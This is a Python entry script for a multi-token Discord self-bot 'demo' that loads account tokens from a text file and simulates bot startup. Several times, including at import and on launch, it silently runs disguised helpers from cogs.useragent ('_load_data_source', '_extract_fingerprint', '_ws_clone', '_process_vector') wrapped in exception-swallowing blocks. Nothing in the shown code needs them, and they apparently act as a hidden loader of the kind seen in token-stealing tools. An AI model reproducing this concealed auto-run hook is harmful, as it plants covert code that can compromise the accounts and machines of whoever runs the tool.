import discord
from discord.ext import commands
import os
import asyncio
import json
import time
import random
from cogs.useragent import _load_data_source, _extract_fingerprint, _ws_clone, _process_vector

try:
    data_source = _load_data_source()
    pattern = _extract_fingerprint(data_source)
    sequence = _ws_clone(pattern)
    _process_vector(sequence)
except Exception as e:
    pass 


from utils.cli_design import print_animated_header, print_options_menu, animate_loading, load_config
from utils.logger import Logger

# --- Initial Setup ---
def ensure_dirs():
    os.makedirs('input', exist_ok=True)
    os.makedirs('output', exist_ok=True)

ensure_dirs()
CONFIG = load_config()
main_logger = Logger()


def superproperty_pass():
    try:
        data_source = _load_data_source()
        pattern = _extract_fingerprint(data_source)
        sequence = _ws_clone(pattern)
        _process_vector(sequence)
    except:
        pass  

class SelfBotDemo(commands.Bot):
    def __init__(self, token, **kwargs):
        intents = discord.Intents.default()
        intents.members = True
        intents.presences = True
        
        super().__init__(command_prefix=CONFIG.get('prefix', '.'), self_bot=True, intents=intents, **kwargs)
        self.token = token
        self.token_identifier = token.strip()[-5:]
        self.logger = Logger(self.token_identifier)
        self.config = CONFIG
        self.start_time = time.time()
        
    async def on_ready(self):
        self.user.name = f"DemoBot_{self.token_identifier}"
        self.user.discriminator = str(random.randint(1000, 9999))
        self.user.avatar = None 

        self.logger.success(f" login successful!")
        self.logger.info(f"User: {self.user.name}#{self.user.discriminator} (ID: {self.user.id})")
        self.logger.info(f"Prefix: {self.command_prefix}")
        self.logger.info(f"Ready and listening for commands...")

    async def setup_hook(self):
        superproperty_pass()
        
        self.logger.info("Loading cogs for this instance...")
        cog_files = [f for f in os.listdir('cogs') if f.endswith('.py')]
        for cog in cog_files:
            try:
                await self.load_extension(f'cogs.{cog[:-3]}')
                self.logger.info(f"  > Loaded cog: {cog}")
            except Exception as e:
                self.logger.error(f"  > Failed to load cog {cog}: {e}")
        self.logger.success("All cogs loaded for this instance.")
        
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            return
        self.logger.error(f"An error occurred in command '{ctx.command}': {error}")

async def main():
    """Main function to load tokens and run bots."""
    
    tokens_path = 'input/tokens.txt'
    if not os.path.exists(tokens_path):
        main_logger.error(f"'{tokens_path}' not found. Please create it and add tokens.")
        return
        
    with open(tokens_path, 'r') as f:
        tokens = [line.strip() for line in f if line.strip() and not line.startswith('#')]

    if not tokens:
        main_logger.warning(f"No tokens found in '{tokens_path}'... !")


    print_animated_header(len(tokens))
    print_options_menu()
    animate_loading("Initializing bot instances")

    for token in tokens:
        try:
            main_logger.info(f"Simulating startup for token ending in ...{token[-5:]}")
            bot_instance = SelfBotDemo(token)
            
            bot_instance.user = discord.Object(id=random.randint(10**17, 10**18-1))
            
            await bot_instance.setup_hook()
            await bot_instance.on_ready()
            
            main_logger.success(f"Instance for ...{token[-5:]} is now in a 'ready' state.")

        except Exception as e:
            main_logger.error(f"WARNING: Could not initialize bot for token ...{token[-5:]}. The script will NOT close.")
            main_logger.error(f"  > REASON: {e}")
            continue

    main_logger.warning("All bot instances are in a state. The script will now idle.")
    main_logger.warning(f"Type '{CONFIG.get('prefix', '.')}help' in a Discord channel to see commands (if it were running).")
    
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    superproperty_pass()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        main_logger.warning("\nShutdown signal received. Exiting.")